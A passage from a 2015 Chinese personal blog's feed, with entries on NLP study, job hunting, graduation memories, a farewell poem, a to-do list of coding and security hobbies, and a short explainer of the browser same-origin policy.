<p>另一方面，写的时候发现自己应该在NLP理论上学习更多，于是看了看<a href="http://www.nltk.org/book/" target="_blank" rel="external">NLTK book</a>，没想到，因为前一阵刚看完<a href="https://hacks.mozilla.org/category/es6-in-depth/" target="_blank" rel="external">Mozilla Hacks的ES6: In Depth系列</a>每次看到它介绍什么，我都想了想NLTK怎么实现的，在javascript中依托ES6该怎么实现。于是把他的FreqDist类在ES6中实现了，终于最后掉到Wordnet这个大坑里。。。开始在js上试图实现NLTK Wordnet Corpus Reader这种东西。顺便说下，写个稍微大点的东西才发现Python真是好啊真是好。所以RedHat的Bruno问，What do you do with Nodjs? 我说。。。String Manipulation我觉得再合适不过了)。</p>
<p>自己实现终究是玩，关键是知道有一票可用的比较高质量的NLP实现。python的有NLTK和果壳某位的snowNLP还有jieba，nodejs有NaturalNode，java啊go啊C++啊啥都有一大堆分词或者新词发现的东西。</p>
<p>一些不错的参考资料如下：</p>
<ul>
<li><a href="http://www.matrix67.com/blog/archives/5044" target="_blank" rel="external">互联网时代的社会语言学：基于SNS的文本数据挖掘</a>（虽然我觉得某个论文讲的更丰富，但论文这种东西，不接地气）</li>
<li><a href="http://www.isnowfy.com/introduction-to-chinese-segmentation/" target="_blank" rel="external">浅谈中文分词</a></li>
<li><a href="http://www.hankcs.com/nlp/" target="_blank" rel="external">Hankcs的各种文章</a>(他的机器学习数据挖掘笔记也值得一看)</li>
</ul>
<p>后来看NLTK了解了下Wordnet这种东西，额，有空再说吧，简单来说就是词、语义、近义词之间的复杂关系网络。</p>
<p>可是wordnet是英文词汇的，中文的质量、近义词语关联都是问题。</p>
<p>结合之前对淘宝大家印象的考虑。看到淘宝对每种标签印象还在评论中标明了相关语句。就简单思考了下怎么通过爬虫获取某宝的近义词/和对应句子数据，打开网络控制台看了看。然而并不知道我能拿来有什么用，做分词之后的tokenize？</p>
<p>反正，好奇心驱使着瞎看了很多也想了很多。真正做的精力却有限的只有未完成的英文Wordnet Corpus Reader、和Matrix67的算法对西游记和鲁迅全集并不觉得效果很好的分词算法实现。</p>
<p>对了，差点忘了NLTK这本书还在继续看，可是Wordnet Corpus Reader不做完我估计是看不下去了。。。感谢丁总还给我发了个电子版能在kindle上看= =</p>
<p>由于贵邮日了狗的毕业设计，对bag of n-gram算法，TFIDF以及如何利用Scikit Learn训练和交叉验证算是熟悉了。</p>
<p>最后，词语的获取，输入法的各种细胞词库、搜索引擎的热搜往往带来的新词啥的</p>
<h4 id="可视化">可视化</h4><p>数据来了之后，就是可视化的问题。WordNet之后就想可视化出来，准备用D3，在看NaturalNode的讨论时看到D3已经拆分，准备之后就看看这个数据驱动的。。。嗯。</p>
<p>算了，都只是设想。我就随便说说，你就随便听听。如能有半点波澜，也没有白花这么久写这么多。</p>
<h2 id="I’m_back|致谢">I’m back|致谢</h2><p>一方面，蛀牙拔掉之后头再没疼过，另一方面，校招早早地就如火如荼。校招走的三心二意。</p>
<p>结果是很多没打算过的阴差阳错有缘无分哈哈。截至现在，没有offer，却觉得这状态不好也好。</p>
<p>感谢这期间，关注过我，为我操心过的:</p>
<ul>
<li><a href="https://github.com/itomsawyer" target="_blank" rel="external">TomSawyer</a>和内推阿里前端的Li Dongmeng师兄</li>
<li><a href="http://armsword.com/" target="_blank" rel="external">Armsword</a>和领英中国内推我的Zhou Tong师兄</li>
<li><a href="http://reverland.org">我的腾讯一面面试官Wu Lijian</a></li>
<li>给了波Microsoft的内推的<a href="https://ichon.me/" target="_blank" rel="external">Chon</a>，好吧，我做了二十分钟笔试就去游泳了。</li>
<li>愿意为我推某安全创业公司的<a href="http://www.programlife.net/ctf-binary-tricks.html" target="_blank" rel="external">天枢Teacher G</a></li>
<li>直接向某互联网金融公司HRD推荐我的<a href="http://m.instrument.com.cn/" target="_blank" rel="external">周老板</a>，虽然因为实习问题就没有然后了。。。</li>
<li>还有<a href="https://github.com/sbilly" target="_blank" rel="external">sbilly大大</a></li>
<li>来自美团的碧水中的扯旗鱼</li>
<li>帮朋友内推头条的qiukun大神</li>
<li>帮朋友内推搜狗的<a href="https://github.com/lkasdolka" target="_blank" rel="external">lkasdolka</a></li>
<li>复试没去还打电话联系我又给硬安插了一次面试的的Tencent HR zyy</li>
</ul>
<p>我故不才，辜负了大家的期望= =，一直犹犹豫豫。</p>
<p>最近投了个Redhat的前端简历，虽然。。。Redhat根本不招前端基本都是java和kernel为主。。。但怎么说，真是一家和开源紧密联系的企业，我就参加了这一场宣讲，全都是讲开源去了。而且自从从greathaul那里听说了远程工作这个东西，其实，还是很有倾向。听到Fang Yue说到他一般在家工作眼睛感觉一亮</p>
<p>再看吧，感谢Bruno的关注和Jim Ma和Zhang Cheng的指教。还有组织Redhat活动的Charlie？和联系的HR们。在Redhat的工作，看上去真是很有挑战。嗯，不管怎样，我前所未有的觉得java大法好。</p>
<p>我一度觉得，自己干了太多没有意义的事情，时光如梭、岁月流逝，身边的人都承担起了自己的生活和他人的未来，我还是无所作为也没做啥有价值的事。</p>
<p>后来，看到<a href="https://github.com/taizilongxu/douban.fm/blob/13c68d2b1083eefe6ea162983b0de232469e1693/doubanfm/lrc2dic.py" target="_blank" rel="external">douban.fm中的某个文件</a></p>
<p>看到<a href="http://fangwang.me/2015/06/22/chinese-python-positions-analysis-based-on-lagou-data.html" target="_blank" rel="external">国内 Python 职位分析</a></p>
<p>看到<a href="http://www.scipy-lectures.org/preface.html#contributing" target="_blank" rel="external">scipy lecture notes的贡献者名单中</a>竟然有我。。。</p>
<p>偶然看到<a href="http://sterncat.github.io/all/optics/2015/03/22/Opticspy-develop.html" target="_blank" rel="external">一个光学python库</a>，简直是我还在学光学时梦寐以求的东西。没想到作者竟然是贵邮的，更没想到作者竟然说看过我的网站上的相位去包裹的两篇文章。虽然已然不知道是什么了。</p>
<p>等等。</p>
<p>我想吧，也好吧。就像当年受到那些对开源非常友好又充满热情的Linux用户，可能我都不记得他们是谁了，他们甚至只是记录了简单的甚至错误的东西。但他们的文章、笔记、天真烂漫的态度和热情则深深感染我并驱使和决定了我今后的人生轨迹。希望自己头晕脑胀记下的絮絮叨叨的只言片语，某些热情、坚韧和情怀，能播下哪怕一点点思维模因的种子。也许哪一天，我们所梦中的世界就真的在人间降临吧。</p>
<p>天空不曾留下痕迹，但我已飞过。就算再也不能飞。</p>
<p>我想说，别忘记在评论或者邮件给你赞许的人以反馈，人生短暂，珍惜每个有缘的人。</p>
<p>好多曾经关注的博客、人，渐渐消失在视野之中，愿他们从未走远，过去，现在，未来。</p>
<h2 id="从Jekyll迁移到Hexo">从Jekyll迁移到Hexo</h2><p>从jekyll迁移到了hexo。</p>
<p>其实不想迁移，我不想打破很多现有的东西。</p>
<p>jekyll要求ruby版本高于2.1. Ubuntu源里只到2.0。但我的笔记本散热不好，两次用rvm编译Ruby cpu过热直接灭了之后，还是用熟悉的node吧。话说，为了解决过热这种问题我把cpufrequtils和cpulimit都用上了。</p>
<p>详情请期待之后的文章。</p>
<h3 id="TODO">TODO</h3><ul>
<li>RSS</li>
<li>友链</li>
<li>评论</li>
<li>统计</li>
<li>分类、标签关于页面</li>
<li>我想改个主题</li>
<li>数学公式</li>
<li>简历等迁移</li>
</ul>
<p>暂时先这样，等整个站点完全改完了，就会把当前页面替换吧。现在关注的各位，对不住了，使用谷歌搜索检索本站吧。</p>
<p>感谢您一直看到这里。写了一天，论文一个字没写，好累。</p>
<p>Have fun!</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="看病与思考">看病与思考</h2><p>昨日，很遗憾听说一个朋友的兄弟在出车祸之后一个月后，终于还是走了。生死去来，棚头傀儡，一线断时，落落磊磊。</p>
<p>前几个月，我也很难过，一度不知道面对的是什么。我想说说看病的经历。</p>
<p>症状是头疼，疼得特别]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Maybe the last post here]]></title>
    <link href="http://reverland.org/life/2015/08/07/maybe-the-last-post-here/"/>
    <id>http://reverland.org/life/2015/08/07/maybe-the-last-post-here/</id>
    <published>2015-08-06T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<p>花二十分钟，也许这将是这里最后一篇了。</p>
<p>随便扯些什么，反正二十分钟后我就该关上编辑器。已经将尽一个月没有打开vim，操作的熟悉感依然。</p>
<p>我还好好的活着，日子依然如旧，世界照常运转。</p>
<p>想应该爱过</p>
<p>想应该挣扎过</p>
<p>甚至向往过</p>
<p>破灭过</p>
<p>也追寻到一霎那的欢愉</p>
<p>转瞬即逝的成就感</p>
<p>觉得离她很近</p>
<p>觉得世界布满了光</p>
<p>觉得一切都像碧水那样。</p>
<p>莫说相公痴，更有痴似相公者</p>
<p>叹人间，美中不足今方信，便纵是举案齐眉，到底意儿难平</p>
<p>晓来谁染霜林醉，总是离人泪</p>
<p>觉得光明过觉得黑暗</p>
<p>心灰意冷过</p>
<p>坚持过</p>
<p>还没开始都放弃过</p>
<p>无所谓了。</p>
<p>整篇意识流，不要指望有什么中心思想</p>
<p>因为这是，</p>
<p>告别，</p>
<p>是</p>
<p>宣言</p>
<p>也是展望</p>
<p>更是一首不写给任何人</p>
<p>也是写给每个有缘的看客的诗</p>
<p>心似双丝网，中有千千结。</p>
<p>莫把幺弦拨，怨极弦能说</p>
<p>狂风落尽深红色，后面一句我打不出来了</p>
<p>我喜欢挺民谣</p>
<p>当你听到时</p>
<p>民谣就属于每个听者</p>
<p>它会是每个人独有的诗</p>
<p>落花有意随流水，流水。</p>
<p>无心</p>
<p>美中不足</p>
<p>好事多魔</p>
<p>一切有为法如梦幻泡影</p>
<p>如露亦如电</p>
<p>执念</p>
<p>执念</p>
<p>执念</p>
<p>终于还会破灭</p>
<p>我要告别</p>
<p>一片碧水丹心</p>
<p>一片痴情如梦</p>
<p>告别美丽的姑娘</p>
<p>告别难以割舍的校园</p>
<p>告别自由自在的岁月</p>
<p>我已经告别了家乡</p>
<p>告别了爹娘</p>
<p>告别了爱着的亲人</p>
<p>无能为力的让世界吞噬</p>
<p>告别了理想</p>
<p>告别了金色的梦乡</p>
<p>告别了无边的畅想</p>
<p>和天马星空的心</p>
<p>无所畏惧的心</p>
<p>坚韧不拔的心</p>
<p>这是首</p>
<p>写给秋天的歌</p>
<p>是一首写个夏天的挽歌</p>
<p>有多少个夏天可以重来</p>
<p>时光永远停在永无止境的八月</p>
<p>停在</p>
<p>四月是你的谎言</p>
<p>生死去来</p>
<p>棚头傀儡</p>
<p>一线断时</p>
<p>落落磊磊</p>
<p>千言万语千言万语</p>
<p>算了，没啥想说的</p>
<p>四年前</p>
<p>七年前</p>
<p>十二年前</p>
<p>二十年前</p>
<p>一百年前</p>
<p>千万年前</p>
<p>时间就这样</p>
<p>世界就这样</p>
<p>生老病死</p>
<p>无常变幻</p>
<p>有开始</p>
<p>就有结束</p>
<p>离恨恰似春草，更行更远还生</p>
<p>然而</p>
<p>挺不住</p>
<p>留不住</p>
<p>抓不住</p>
<p>再见</p>
<p>让我再说一万遍</p>
<p>时光都变成了烟</p>
<p>变成了楼下的柿子树</p>
<p>窗前的风</p>
<p>无人顾怜的窗前薄荷</p>
<p>和办公室一个人敲着无意义文字的我</p>
<p>再见</p>
<p>域名应该也要到期了</p>
<p>再见</p>
<p>就这样，所有无关紧要的</p>
<p>将烟消云散。</p>
<p>不是科学技术，不是钱，不是权利，是我们心中的圣光</p>
<p>成就我们的世界和生命的意义。</p>
<p>有缘认识你们真好。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>花二十分钟，也许这将是这里最后一篇了。</p>
<p>随便扯些什么，反正二十分钟后我就该关上编辑器。已经将尽一个月没有打开vim，操作的熟悉感依然。</p>
<p>我还好好的活着，日子依然如旧，世界照常运转。</p>
<p>想应该爱过</p>
<p>想应该挣扎过</p>
<]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[七月流火？]]></title>
    <link href="http://reverland.org/life/2015/07/03//"/>
    <id>http://reverland.org/life/2015/07/03//</id>
    <published>2015-07-02T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>沙上并禽池上瞑，云破月来花弄影。</p>
</blockquote>
<h2 id="摄影">摄影</h2><p>短暂的摄影生涯呢。康神给我留下了个Canon 60D玩，<a href="http://www.d0u9.xyz/" target="_blank" rel="external">D0u9</a>带着我玩了一阵，算是入了门，大致知道ISO，F数还有啥啥的都怎么回事，碰到光强的时候怎么办，阴天如何，什么时候拍照效果好，又科普了种种镜头滤镜，他在某本古老的摄影杂志上看来的种种技巧，关注的新闻中那些天马行空的户外摄影师和那些专注产品摄影的光影魔术师。</p>
<p>然后，我依然发现，感觉还没我用手机拍出来的效果好= =。。。</p>
<p>但科研楼天台上拍蓝天白云。远处的群山云影，历历在目。</p>
<p>在阴森的主楼厕所里拍主楼华灯初上，天际微白。</p>
<p>可是，我渣本处理这些巨大的RAW文件，简直卡到。。。</p>
<p>而且看不懂gimp那个UFRaw插件怎么用。。。</p>
<p>直到呢，有次给游泳队拍照，拍下了某某妹子没睁眼(原谅渣摄影！！！)，然后动手画上了一双水灵灵的大眼睛。。。我发给女主问她，女主竟然没发现！！！！！！！！！！！</p>
<p>我觉得，还是绘画更能表达人的情感，而摄影怎么也不可能还原我想看到的东西。</p>
<p>可是。。。我画的画都是这样的！！！！！！</p>
<p>![画]</p>
<h2 id="树莓派和山寨四轴">树莓派和山寨四轴</h2><p>D0u9入了个树莓派2,一直向我安利性能比1好了多少多少。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>沙上并禽池上瞑，云破月来花弄影。</p>
</blockquote>
<h2 id="摄影">摄影</h2><p>短暂的摄影生涯呢。康神给我留下了个Canon 60D玩，<a href="http://www.d0u9.xyz/" target="]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[好像毕业的是我似的]]></title>
    <link href="http://reverland.org/life/2015/06/27//"/>
    <id>http://reverland.org/life/2015/06/27//</id>
    <published>2015-06-26T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<p>小松林对面大屏幕里不停放着西土城路十号的日子，好像毕业的是我似的。</p>
<p>学十一下面，学八下面接连好几场露天毕业歌会，好像毕业的是我似的。</p>
<p>校园里到处是穿着学士服拍照的男男女女，黑色点缀着黄色银色和粉色，好像毕业的是我似的。</p>
<p>去年九月份，我在回家的火车上。怎么就说到多喜欢这里了，对北邮言必黑，谈必骂，然而我知道我走的时候一定会哭得一塌糊涂。</p>
<p>哭得一塌糊涂。</p>
<p>还没有毕业就已经哭了。</p>
<p>好像毕业的是我似的。</p>
<h2 id="从两年前开始毕业">从两年前开始毕业</h2><blockquote>
<p>再见再见再见再见一万遍，如果明天就不再见。</p>
</blockquote>
<p>两年前的四月，第一次踏进这片土地，小松林的大屏幕映放着新闻联播，映着白惨惨的光。历历在目。</p>
<p>九月份来完成分组，被分到某组，和实验室的师兄和青阳一起去教三和主楼搬东西，新雨过后，树木翠绿蓊郁，一边气不饱的三轮车、一个脚坏的来自中心的板车，还有康神说青阳的人生梦想就是坐在三轮车上唱着歌，往事像风一样被吹散了。</p>
<p>两年后又一次和师弟师妹推着板车搬去教三，顺路和青阳下主楼地下室，我的心都快碎了，所有的人都吹散了。</p>
<p>两年间搬了三次地方，换了五个项目组，穿插着帮忙n次，见识了那些可爱的人们，我不想忘记。</p>
<p>两年前翔哥毕业时，我以为一切还远，毕业比想像中来的突然。</p>
<p>三个月前送康神去邮局邮寄行李，已然历历在目，看着他在邮局穿针引线，看着他在包裹上书写家里的地址，看着邮局鱼缸中无忧无虑游来游去的鱼，我看他的侧影是这么伟大，却觉得送走的时候觉得这么凄凉。似乎穿越时光在送别一年后离开的自己，他年葬侬知是谁。</p>
<p>最早时一起去银河的师兄。。。我写不下去这条线了，到此为止。</p>
<p>终于也离开实验室了，恨不得给每个人告别，一个一个抱住亲吻。</p>
<h2 id="碧水情深">碧水情深</h2><p>几天前游泳队拍毕业照，我说把我叫上啊。</p>
<p>转眼就毕业了，两年前紫强才大三，我还很羡慕他们的青春岁月还很长很长。</p>
<p>见着他争取保研，做了阵销售，干了阵产品，开始准备出国然后就毕业了。</p>
<p>好像所有人都被不可名状的巨大力量推着前进，身不由己。很多熟悉的面孔都渐渐从身边消失了。</p>
<p>扯旗毕业了，其实毕业前就慢慢不再见得到。</p>
<p>彬哥早毕业了。</p>
<p>涂涂也见得少，也忙着为出国做准备</p>
<p>丹丹也很少见到，应该忙着学业和健身吧</p>
<p>丁总倒是最近常见到去游个澡，7月2号就远赴异国他乡了</p>
<p>黄老师，听说上班忙成，嗯</p>
<p>范老师，倒经常有见到。</p>
<p>金帽女神反正我去的晚从来没见到过。。。</p>
<p>小忧自从成为女博士之后好像就没见到过了</p>
<p>前几天忽然碰到杨宇，一说都有一个月没游了</p>
<p>前几天还碰到某庄子睿，怎么也准备弃研去香港，月余不游泳了。</p>
<p>翔哥毕业前还常去，现在偶尔会回来陪师姐游下。</p>
<p>刘可昂男神估计，随着我们即将毕业也会去得越来越少。</p>
<p>高鸣男神倒是，好羡慕他还有两年。</p>
<p>师姐也好久没游了。</p>
<p>救生员换了一波，晚上说我去晚了，李涛去了，我着实吃了一惊。</p>
<p>哎呦我去，还有毕业的师姐和之前碰到还经常打招呼然而并不知道叫什么的师姐同学</p>
<p>一起打腿，休学回家不知现在如何的谢浩师兄。</p>
<p>毕业那阵紫强说他三观混乱，现在混乱的终于轮到我了。</p>
<p>碧水中纷乱的梦，</p>
<p>东门内那片地方是我在北邮最爱的地方</p>
<p>碰到的朋友是北邮最宝贵的收获，相形而言，毕业文凭一文不值。</p>
<p>好像毕业的是我似的，让我的泪水拥抱亲吻那片碧水，留下那颗依依不舍的心。</p>
<h2 id="GC">GC</h2><p>心好乱，纷呈的往事倾泻而出，无处放置。</p>
<p>北邮和社团扯上关系，一个是研会实践部，只是偶尔帮帮忙的酱油般存在，另一个就是GC了。</p>
<p>在小松林两年落魄的招新，凭借着aus忽悠了一大堆妹子然后听说第一次见面会就被aus放光了T T。</p>
<p>去蹭GDG各种活动和午饭</p>
<p>时光广场的游园会。</p>
<p>一次随性而至在学活下火锅煮排骨汤。。。</p>
<p>有兴趣看看这里吧<a href="http://reverland.org/life/2014/10/11/gcjust-for-fun/">追忆GC：Just For Fun</a></p>
<p>今天和aus拍了毕业照，aus还在盘算着让我们去他的新居桌游啊跑团啊blabla啊，我希望这不是有生之年，人生轨迹的最后一次交错。</p>
<p>aus竟然还把当年我们坐在马路沿子上落魄招新时让旁边一妹子拍下来的照片洗出来了。。。</p>
<p>这就毕业了？</p>
<p>感觉好像毕业的是我似的。</p>
<h2 id="大学同学们">大学同学们</h2><p>纷纷都安定下来或马上要安定下来了吧。</p>
<p>端午的时候涛涛忽然来找我，一起来帝都上学，然而他已然答辩完毕业。去北理再也没有可以随意蹭饭的人了吧。在学校的主干道上，我觉得吹过的风是时光的呜咽，洒落的阳光是细碎的记忆。</p>
<p>好像毕业的是我似的，</p>
<p>不记得说了些什么。</p>
<p>只记得路上碰到师妹问我去哪。</p>
<p>我只说出了随便转转几个字。</p>
<h2 id="毕业的是我吧">毕业的是我吧</h2><p>两年前，我不知道我想些什么</p>
<p>不知道我期待些什么</p>
<p>我写代码</p>
<p>游泳锻炼身体</p>
<p>做觉得有意思的事情</p>
<p>四处骚扰同学朋友</p>
<p>乖乖的毕业</p>
<p>顺利的找到高薪有户口的工作</p>
<p>捉一只妹子相伴余生</p>
<p>两年后所有都依然很远，</p>
<p>却知道自己多幸福</p>
<p>千里之外的亲人，睡了两年的室友们，在北邮随便走走都能碰到打招呼的朋友，在一个实验室的老师同学，在北京还多有联系的大学高中同学。</p>
<p>取自红楼梦一句话，总结和自勉：</p>
<blockquote>
<p>美中不足，好事多魔。</p>
</blockquote>
<p>就当我们昨天刚毕业吧。</p>
<p>好伤心。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>小松林对面大屏幕里不停放着西土城路十号的日子，好像毕业的是我似的。</p>
<p>学十一下面，学八下面接连好几场露天毕业歌会，好像毕业的是我似的。</p>
<p>校园里到处是穿着学士服拍照的男男女女，黑色点缀着黄色银色和粉色，好像毕业的是我似的。</p>
<p>去年九月份，]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一团乱麻]]></title>
    <link href="http://reverland.org/life/2015/06/12//"/>
    <id>http://reverland.org/life/2015/06/12//</id>
    <published>2015-06-11T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<p>这一个月在完成实验室的某某项目，对浏览器的混乱性有更加身临其境的体会。</p>
<p>顺便，因为看了别人的metasploit模块，自己也写了个图书馆登录brute force玩玩。跟着wiki和已有的模块好像也不是什么难事。结果真是爱上ruby这门让程序员感到快乐的语言了。正如metasploit unleash 里所说的，因为mixin和各种语法糖，ruby rocks！</p>
<p>而js，由于种种历史和现实原因，可以说是一团乱麻。把javascript the good parts看完，感慨这门语言的强大表现力和灵活性的同时，也感慨灵活而来的种种问题。</p>
<p>百度前端技术学院的作业倒是很久没有动手了，360的前端培训营我给拒了。。。很庆幸没去，到白河湾臭水沟get漂流技能，到高大上的英东游泳馆get摄影技能和跳发技能。感谢某大软安和某游泳队，哈哈。</p>
<p>但是，js却一直在看，没怎么写，总觉得太灵活驾驭不住。把YDKJS的scope那本看完，似乎对很多问题都清楚了很多，然后this、object和prototype只看到mixin章节，不过感觉基础的知识都讲到了。另外YDKJS关于ES6讲的比较多，额。。。</p>
<p>想做个qq机器人，最后也没空做，看到<a href="https://github.com/xhan/qqbot" target="_blank" rel="external">qqbot</a>又瞄了两眼coffee script，觉得似乎ES6和coffee script解决了相同的问题= =，然而coffee script的语法比纯js，es6的js更好看。。。</p>
<p>康神把相机留给我玩了，这两天北京的蓝天和白云美的让人心醉。<a href="http://d0u9.xyz" target="_blank" rel="external">d0u9</a>带着我开始拍云彩，爬到主楼阴森的顶楼排夜景。直到开始处理图像，才觉得电脑性能真是不堪。</p>
<p>n多计划，一团乱麻。</p>
<ul>
<li>囚徒健身</li>
<li><p>包干游泳</p>
</li>
<li><p>图像处理技能</p>
</li>
<li>绘图技能</li>
<li><p>摄影技能</p>
</li>
<li><p>在树莓派上布置蜜罐。</p>
</li>
<li>完善ssh扫描器搜集iphone信息</li>
<li>完善某项目中关于某设备的批量扫描嗅探</li>
<li><p>看各种lkm/内存映射/用户态/GPU rootkit代码，写rootkit</p>
</li>
<li><p>百度前端技术学院作业，PC版和移动版</p>
</li>
<li><p>在树莓派上写个基于node+websocket的聊天室玩</p>
</li>
<li><p>把搁置多年的操作系统写完，也许再用rust写一遍。</p>
</li>
<li><p>看书，rust手册，YDKJS，metasploit unleash</p>
</li>
<li>看代码，某设备加密算法js实现，某些js库的一些源码，metasploit的一些代码，一些linux内核模块代码(iptables)</li>
<li><p>linux下安全审计接触的一些东西。如何发现被入侵，pam，audit，iptables这些都怎么回事。嗯。。。还有SELinux。。。</p>
</li>
<li><p>毕设，操作系统原理，shellcode和libemu，各种数据挖掘算法。</p>
</li>
</ul>
<p>几篇可能会补上的：</p>
<ol>
<li>浏览器安全，xss能做到什么，怎么做，keylogger实现，扫描器，beef项目。</li>
<li>metasploit模块编写——ruby rocks</li>
<li>树莓派——坑爹的安装配置之旅。升级到jessie，配置winATE。</li>
<li>某某加密算法源码解析(不公开)</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>这一个月在完成实验室的某某项目，对浏览器的混乱性有更加身临其境的体会。</p>
<p>顺便，因为看了别人的metasploit模块，自己也写了个图书馆登录brute force玩玩。跟着wiki和已有的模块好像也不是什么难事。结果真是爱上ruby这门让程序员感到快乐的语言了]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Security in Browsers]]></title>
    <link href="http://reverland.org/security/2015/06/01/security-in-browsers/"/>
    <id>http://reverland.org/security/2015/06/01/security-in-browsers/</id>
    <published>2015-05-31T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<h2 id="同源策略">同源策略</h2><p>同源策略限制来自某个源的文档或者脚本与另一个源的资源交互。同源策略用来阻止一些CSRF攻击。</p>
<h3 id="定义">定义</h3><p>协议+端口(如果指定)+主机都相同。</p>
<h4 id="继承源">继承源</h4><p>来自<code>about:blank</code>，<code>javascript:</code>和<code>data:</code>的URL内容继承加载这个文档的URL的源，因为它自身并没有关于源的信息。</p>
<h4 id="IE特例">IE特例</h4><p>IE有两个关于同源策略的例外：</p>
<ol>
<li>信任区域(Trust Zones):如果两个域名高度互信，比如同一个公司域名，不使用同源策略。</li>
<li>端口：IE的同源策略不考虑端口。</li>
</ol>
<h3 id="变更源">变更源</h3><p>更改页面的源受到限制。脚本可以把<code>document.domain</code>设成当前domain的子集。之后就以此可以作为同源检查的源。例如，页面<code>http://store.company.com/dir/other.html</code>上的脚本可以这样：</p>
<pre><code>document<span class="class">.domain</span> = <span class="string">"company.com"</span>
</code></pre><p>注意必要时要指定端口号，否则会被赋值成null。</p>
<p>让子域安全访问父域必须将两者的<code>document.domain</code>设置为相同。</p>
<h3 id="跨域网络访问">跨域网络访问</h3><p>同源策略控制两个不同源的交互，当使用<code>XMLHttpRequest</code>或者<code>img</code>标签时。这些交互分为3类：</p>
<ol>
<li>跨域<code>写入</code>通常是允许的。例如链接(links)，重定向(redirects)和表单提交。某些罕见的HTTP请求需要<code>preflight</code>。</li>
<li>跨域嵌入通常是允许的。例子如下</li>
<li>跨域读取通常不允许，但通常通过嵌入泄漏了不可读内容。例如你可以读到嵌入图像的长宽，嵌入脚本的行为，或者<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=629094" target="_blank" rel="external">嵌入资源的可访问性</a>。</li>
</ol>
<p>以下是一些跨域嵌入的例子：</p>
<ul>
<li>通过<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code>嵌入的JS。语法错误信息只能在同源脚本中捕捉到。(然我并不理解，只看到浏览器可以捕捉到引入脚本的语法错误)</li>
<li>通过<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>嵌入的CSS。由于CSS松散的语法规则，同源策略要求跨域CSS有正确的<code>Content-Type</code>头。各个浏览器对跨域CSS的限制都不同。</li>
<li>通过<code>&lt;img&gt;</code>嵌入的图像，支持png，jpeg，gif，bmp，svg。。。格式</li>
<li>通过<code>&lt;video&gt;</code>和<code>&lt;audio&gt;</code>嵌入媒体文件。</li>
<li><code>&lt;object&gt;</code>，<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>嵌入的插件。</li>
<li>通过<code>@font-face</code>嵌入的字体。有些浏览器允许跨域字体，有的不行。</li>
<li>任何<code>&lt;iframe&gt;</code>或者<code>&lt;frame&gt;</code>嵌入的东西，网站可以通过设置<code>X-Frame-Options</code>头阻止这种跨域。</li>
</ul>
<h4 id="如何允许跨域访问">如何允许跨域访问</h4><p>使用CORS</p>
<h4 id="如何阻止跨域访问">如何阻止跨域访问</h4>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="同源策略">同源策略</h2><p>同源策略限制来自某个源的文档或者脚本与另一个源的资源交互。同源策略用来阻止一些CSRF攻击。</p>
<h3 id="定义">定义</h3><p>协议+端口(如果指定)+主机都相同。</p>
<h4 id="继承源">继承源</]]>
    </summary>
    
      <category term="browser" scheme="http://reverland.org/tags/browser/"/>
    
      <category term="security" scheme="http://reverland.org/tags/security/"/>
    
      <category term="security" scheme="http://reverland.org/categories/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hacking Security]]></title>
    <link href="http://reverland.org/life/2015/05/24/hacking-security/"/>
    <id>http://reverland.org/life/2015/05/24/hacking-security/</id>
    <published>2015-05-23T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<h2 id="TSCTF2015">TSCTF2015</h2><p><img src="/images/tsctf.png" alt="TSCTF2015" title="TSCTF2015"></p>
<p>准备折腾近乎三周的TSCTF终于在昨天圆满结束，这三周来眼见到主板者的耐心与热情，亲历他们的付出与坚持。非常敬佩在此次活动中付诸心血和时间的所有人，以及他们在比赛承办过程中显示的卓越智慧和气质。</p>
<p>至于为何社团忽然建立，为何和阿里巴巴技术联盟一起举办了个校内赛，其中错综复杂种种并不清楚。后来颁奖阿里巴巴安全部技术总监和一位HR姐姐来了，对总监的名字非常眼熟，但我记得是在绿盟而不是阿里，抱着试试看的心理一问竟然真是siblly。没想到绿盟上市后这么多人离开了。</p>
<p>第一次见到天枢的幕后BOSS，没有他大概场地和资源都连影都没有，当然没有阿里也就没有主干道不输天池大数据和微软编程之美的霸气展板和外场宣传，也没影了大多数奖品，一个校赛宣传和奖品规格真是不低。</p>
<p>比赛中出了两道misc题目。有兴趣可以玩玩，根据题目提示获取flag，flag形式为TSCTF{xxxxxxxxxxxxxxxxx}的格式</p>
<ul>
<li>初赛misc3：<a href="http://buptlug.cn/steganography.html" target="_blank" rel="external">Steganography</a></li>
